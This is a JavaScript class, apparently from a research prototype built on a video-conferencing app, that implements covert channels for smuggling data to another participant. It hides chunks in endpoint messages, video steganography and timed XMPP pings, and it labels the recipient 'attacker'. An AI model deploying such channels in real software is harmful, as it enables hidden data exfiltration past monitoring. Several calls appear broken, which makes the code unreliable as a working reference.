/* global APP, splitString */

import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

import CovertCommunicationInitiator from './CovertCommunicationInitiator';
import VideoSteganoEffect from './VideoSteganoEffect';


/**
 * Implementation of different convert channel methods
 */
export default class CovertTransmitter extends CovertCommunicationInitiator {

    // reference to all other methods
    options = {
        'endpoint': CovertTransmitter.useEndpoint,
        'video': CovertTransmitter.useVideo,
        'audio': CovertTransmitter.useAudio,
        'xmpp': CovertTransmitter.useXMPP
    };

    /**
     * 
     * @param {object} user 
     * @param {object} configuration 
     * @param {string} data 
     */
    constructor(user, configuration, communicationName, data) {
        super(user, configuration, communicationName);
        this.data = data;
    }

    /**
     * End hidden communication between users
     */
    endCommunication() {
        APP.conference.sendEndpointMessage(this.user.getId(), {
            extraction: 'reply',
            isEnd: true
        });
        this.communicationEnded = true;
    }

    /**
     * Sending data using simple endpoint method
     * @param {any} data - specified data to be sent
     */
    useEndpoint() {
        console.log('self check:', this);
        for (const chunkData of splitString(this.data, this.configuration.chunkSize)) {
            console.log('data:', chunkData);
            APP.conference.sendEndpointMessage(this.user.getId(), {
                extraction: 'reply',
                payload: chunkData
            });
        }
        CovertTransmitter.endCommunication(this.user.getId());
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @param {object} options - Options about the steganography. Throughtput etc.
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, this.data, this.configuration));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    useVideo() {
        const localVideo = APP.conference.localVideo;

        this._createSteganoEffect(localVideo.stream, this.data, this.configuration.method).then(effect => {
            localVideo.setEffect(effect);
        });
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    useAudio() {
        // TODO: not working, create a hidden channel inside the audio using AudioMixer
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;

        new AudioMixerEffect(desktopAudio).then(effect => {
            localAudio.setEffect(effect);
        });

    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    useXMPP() {
        const splitedData = splitString(this.data, this.configuration.chunkSize);

        console.log('Data:', splitedData);

        const intervalRef = setInterval(() => {
            if (!splitedData.length) {
                clearInterval(intervalRef);
                CovertTransmitter.endCommunication(this.user.getId());

                return;
            }
            console.log('attacker:', this.user);
            this.extractionPing(message => {
                console.log('success', message, splitedData);
            }, message => {
                console.log('fail', message);
                console.log('Data sent:', splitedData);
            }, splitedData.shift());
        }, this.configuration.pingInterval);
    }
}
